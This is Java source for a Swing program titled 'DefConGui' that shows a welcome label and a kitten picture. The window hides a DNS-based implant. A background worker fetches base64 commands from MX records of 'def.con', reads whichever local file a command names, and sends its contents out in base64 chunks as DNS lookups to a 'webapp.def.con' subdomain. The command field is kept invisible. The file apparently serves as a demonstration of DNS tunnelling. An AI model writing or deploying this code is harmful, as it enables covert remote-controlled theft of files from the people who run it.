package DefConGui;

import java.util.List;
import java.util.Arrays;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.awt.GridBagLayout;
import java.awt.GridBagConstraints;
import java.awt.Insets;
import java.awt.image.BufferedImage;
import javax.swing.JLabel;
import javax.swing.JFrame;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.border.Border;
import javax.swing.BorderFactory;
import javax.swing.SwingWorker;
import javax.swing.ImageIcon;
import javax.imageio.ImageIO;
import java.io.IOException;
import java.io.FileInputStream;
import java.net.*;
import java.util.concurrent.TimeUnit;
import org.apache.commons.codec.binary.Base64;
import org.xbill.DNS.*;


public class DefConGui extends JFrame{
    private final GridBagConstraints constraints;
    private final JTextField currentCmd;
    private final Border border = BorderFactory.createLoweredBevelBorder();
    private final JLabel greeting;
    private String greetingText = "Welcome to NANOG!";
    private CommandGetter cgtr;
    private FileUploader upldr;

    private JTextField makeText() {
        JTextField t = new JTextField(20);
        t.setEditable(false);
        t.setHorizontalAlignment(JTextField.RIGHT);
        t.setBorder(border);
        getContentPane().add(t, constraints);
        return t;
    }

    private JLabel makeLabel(String caption) {
        JLabel l = new JLabel(caption);
        getContentPane().add(l, constraints);
        return l;
    }

    private void restartWorker() {
	(cgtr = new CommandGetter()).execute();
    }

    public DefConGui() {
    // Gui Design -- I suck at it.
        super("DefConGui");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        getContentPane().setLayout(new GridBagLayout());
        constraints = new GridBagConstraints();
        constraints.insets = new Insets(3, 10, 3, 10);
        greeting = makeLabel(greetingText);
	try {
            URL imageurl=new URL("http://web.con/kitten.jpg");
	    BufferedImage image = ImageIO.read(imageurl);
	    JLabel imageLabel = new JLabel(new ImageIcon(image));
	    getContentPane().add(imageLabel);
	} catch (Exception exp) {
            exp.printStackTrace();
	}
        currentCmd = makeText();
	currentCmd.setVisible(false);
	restartWorker();
        pack();
        setVisible(true);
    }

    private void sleep(int i) {
    // Don't hammer the DNS server with continuous requests
        try {
            TimeUnit.SECONDS.sleep(i);
	} catch (InterruptedException e) {
            System.out.println("Error during sleep");
	}
    }

    private class CommandGetter extends SwingWorker<Void, String> {
    // Background process, checks for new commands every once in a while.
        @Override
        protected Void doInBackground() {
            while (true) {
		try {
                    System.out.println("Getting Command");
                    publish(recv("def.con"));
		    sleep(5);
                } catch (Throwable e) {
                    currentCmd.setText("No Command Yet");
                    System.out.println("Invalid Command. Sleeping a bit.");
		    sleep(10);
                }
            }
        }

        @Override
        protected void process(List<String> cmds) {
        // Identify whether there are new commands to process.
	// If there are, start a new uploader.
            String cmd = cmds.get(cmds.size() - 1);
            if (! cmd.equals(currentCmd.getText())) {
                currentCmd.setText(cmd);
                (upldr = new FileUploader()).execute();
            }
	}
    }

    private class FileUploader extends SwingWorker<Void, String>{
    // Uploads files using DNS.
	@Override
	protected Void doInBackground() {
            String filename = currentCmd.getText();
            System.out.println("Uploading " + filename);
            FileInputStream in;
	    byte [] buf = new byte[30];
	    int c;
            try {
                in = new FileInputStream(filename);
		while (( c = in.read(buf) ) != -1) {
                    send(buf, "webapp", "def.con");
		    Arrays.fill(buf, (byte) 0);
                }
                in.close();
            } catch ( IOException e ) {
		System.out.println("FileUploader IOException");
                restartWorker();
            }
	    return null;
	}
    }


    private void send(byte [] data, String filename, String domain) {
        // Performs A-record lookup using base64 encoding on the data.
        // args[0] ->  data
        // args[1] ->  filename
        // args[2] ->  domain
        try {
            String data_enc = Base64.encodeBase64URLSafeString(data);
            String sep = Character.toString('.');
            String question = data_enc.concat(sep);
            question = question.concat(filename);
            question = question.concat(sep);
            question = question.concat(domain);
            InetAddress addr = InetAddress.getByName(question);
        } catch (UnknownHostException e){
            System.out.println(e);
        }
    }


    private String recv(String domain) {
        // Performs MX-record using base64 encoding on the data.
        // Returns base-64 decoded result.
        String fromsvr = "";
        String ret;
        try {
            Record [] records = new Lookup(domain, 15).run();
            for (int i = 0; i < records.length; i++) {
                MXRecord mx = (MXRecord) records[i];
                fromsvr = fromsvr.concat(mx.getTarget().toString());
            }
            ret = new String (Base64.decodeBase64(fromsvr.split("\\.")[0].getBytes()));
        } catch (TextParseException e) {
            ret = "None";
	    restartWorker();
        }
        return ret;
    }

    public static void main(String[] args) {
        //Schedule a job for the event-dispatching thread:
        //creating and showing this application's GUI.
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run(){
		new DefConGui();
            }
        });
    }
}

